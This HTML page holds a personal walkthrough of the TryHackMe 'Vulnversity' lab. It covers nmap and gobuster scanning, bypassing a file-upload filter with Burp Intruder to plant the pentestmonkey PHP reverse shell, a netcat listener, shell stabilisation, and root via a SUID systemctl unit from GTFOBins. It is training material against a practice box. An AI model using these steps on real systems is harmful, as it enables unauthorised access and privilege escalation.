<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Learn about active recon, web app attacks and privilege escalation."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:title" content="Vulnversity"><meta property="og:description" content="Learn about active recon, web app attacks and privilege escalation."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/docs/TryHackMe/Vulnversity-copy/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><title>Vulnversity | Notes</title>
<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png><link rel=canonical href=http://localhost:1313/docs/TryHackMe/Vulnversity-copy/><link rel=stylesheet href=/book.min.48998495a87efa125d503cd3daff92242ea5a041218ba966d2d60eed70d83cd3.css integrity="sha256-SJmElah++hJdUDzT2v+SJC6loEEhi6lm0tYO7XDYPNM=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.469ca4d8c53bfb036b2eb5c09874109c4da9226e3be69ae582c17c0973163dd0.js integrity="sha256-Rpyk2MU7+wNrLrXAmHQQnE2pIm475prlgsF8CXMWPdA=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>Notes</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle checked>
<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Try Hack Me</a></label><ul><li><a href=/docs/TryHackMe/Vulnversity-copy/ class=active>Vulnversity</a></li><li><a href=/docs/TryHackMe/Vulnversity/>Vulnversity</a></li><li><a href=/docs/TryHackMe/Blue/>Blue</a></li><li><a href=/docs/TryHackMe/Kenobi/>Kenobi</a></li><li><a href=/docs/TryHackMe/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/TryHackMe/Alfred/>Alfred</a></li><li><a href=/docs/TryHackMe/HackPark/>Hack Park</a></li><li><a href=/docs/TryHackMe/DailyBugle/>Daily Bugle</a></li></ul></li><li><input type=checkbox id=section-d03949e4a854df2320014bae25b6f4d6 class=toggle>
<label for=section-d03949e4a854df2320014bae25b6f4d6 class="flex justify-between"><a role=button>Hack the Box</a></label><ul><li><a href=/docs/HackTheBox/DailyBugle/>Daily Bugle</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
</label><strong>Vulnversity</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li><a href=#task-1>Task 1</a></li><li><a href=#task-2>Task 2</a></li><li><a href=#task-3>Task 3</a></li><li><a href=#task-4>Task 4</a></li><li><a href=#task-5>Task 5</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><p>Learn about active recon, web app attacks and privilege escalation.</p><h2 id=task-1>Task 1
<a class=anchor href=#task-1>#</a></h2><p>Deploy the machine.</p><h2 id=task-2>Task 2
<a class=anchor href=#task-2>#</a></h2><p>Scan the machine for open ports using nmap.</p><pre tabindex=0><code>nmap -sVC -oN vulnversity.txt 10.10.79.6
</code></pre><p>There was an apache server running on port 3333.</p><h2 id=task-3>Task 3
<a class=anchor href=#task-3>#</a></h2><p>Let&rsquo;s fuzz for directories using gobuster.</p><pre tabindex=0><code>gobuster dir -u http://10.10.79.6:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</code></pre><p>There was a directory /internal/.</p><h2 id=task-4>Task 4
<a class=anchor href=#task-4>#</a></h2><p>Upon viewing it, there was a file upload functionality. Using this we can upload a malicious php file to get a reverse shell.
Copy the php file from <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> and edit the ip address to tun0 ip address.</p><p>Let us try to upload a php file and see if it&rsquo;s accepting the file type. The file type php is not accepted.</p><p>Start Burp Suite and configure the proxy in the browser.</p><p>Upload the php file that we just created and capture the request in Burp.</p><p>Send the request to intruder and in payload positions, select attack type as sniper and add &lsquo;ยง&rsquo; to the file extension php.</p><p>Go to payload options, add the
extensions php, php3, php4. php5, phtml and start the attack.</p><p>After the attack was completed, we can see the results. In that sort by length and the length for phtml is 723 and for the rest of them 737. Also, for confirming
that it was the correct file type allowed, check the response.</p><p>Now, edit the file extension of the php file we created to phtml.</p><p>Upload the file, and in another terminal start a netcat listener.</p><pre tabindex=0><code>nc -lnvp 1234
</code></pre><p>The file is uploaded, but we don&rsquo;t know where it is uploaded. Let&rsquo;s use gobuster again to fuzz for directories inside /internal.</p><pre tabindex=0><code>gobuster dir -u http://10.10.79.6:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</code></pre><p>There was an uploads directory. In the browser, access the file we uploaded which will be present in the path.</p><blockquote><p>http://10.10.79.6:3333/internal/uploads/php_reverse_shell.phtml.</p></blockquote><p>After file is accessed, we get a reverse shell.</p><p>Now that we&rsquo;ve got a shell, we need to stabilize the shell as it is unstable. We don&rsquo;t want to loose our connection if we hit ctrl+c or anything.</p><p>Run the command to spawn a tty shell.</p><pre tabindex=0><code>python -c &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;
</code></pre><p>Now hit ctrl+z to background it.</p><pre tabindex=0><code>Ctrl+Z
</code></pre><p>Now you will get your shell and disable text display and foreground the process.</p><pre tabindex=0><code>stty raw -echo &amp;&amp; fg
</code></pre><p>Set the terminal variable.</p><pre tabindex=0><code>export TERM=xterm
</code></pre><h2 id=task-5>Task 5
<a class=anchor href=#task-5>#</a></h2><p>Now run to find SUID files with root permission.</p><pre tabindex=0><code>find / -user root -perm -4000 -exec ls -ldb {} \;
</code></pre><p>We found some interesting files. Of them, /bin/systemctl is running as root.</p><p>Head to <a href=https://gtfobins.github.io/gtfobins/systemctl/#suid>https://gtfobins.github.io/gtfobins/systemctl/#suid</a>.</p><p>We will try to follow that to check whether it will work or not.</p><pre tabindex=0><code>TF=$(mktemp).service
echo &#39;[Service]
Type=oneshot
ExecStart=/bin/sh -c &#34;id &gt; /tmp/output&#34;
[Install]
WantedBy=multi-user.target&#39; &gt; $TF
</code></pre><pre tabindex=0><code>./systemctl link $TF
</code></pre><pre tabindex=0><code>./systemctl enable --now $TF
</code></pre><p>Now we see output of the command id in the file we just created.</p><p>Copy and paste it in the shell but make sure to modify the command we need to run inorder to get the root flag.</p><pre tabindex=0><code>TF=$(mktemp).service
echo &#39;[Service]
Type=oneshot
ExecStart=/bin/sh -c &#34;cat root/root.txt &gt; /tmp/output&#34;
[Install]
WantedBy=multi-user.target&#39; &gt; $TF
</code></pre><p>Now create symlink and enable it.</p><pre tabindex=0><code>/bin/systemctl link $TF
</code></pre><pre tabindex=0><code>/bin/systemctl enable --now $TF
</code></pre><p>We got the root flag!!!</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li><a href=#task-1>Task 1</a></li><li><a href=#task-2>Task 2</a></li><li><a href=#task-3>Task 3</a></li><li><a href=#task-4>Task 4</a></li><li><a href=#task-5>Task 5</a></li></ul></li></ul></nav></div></aside></main></body></html>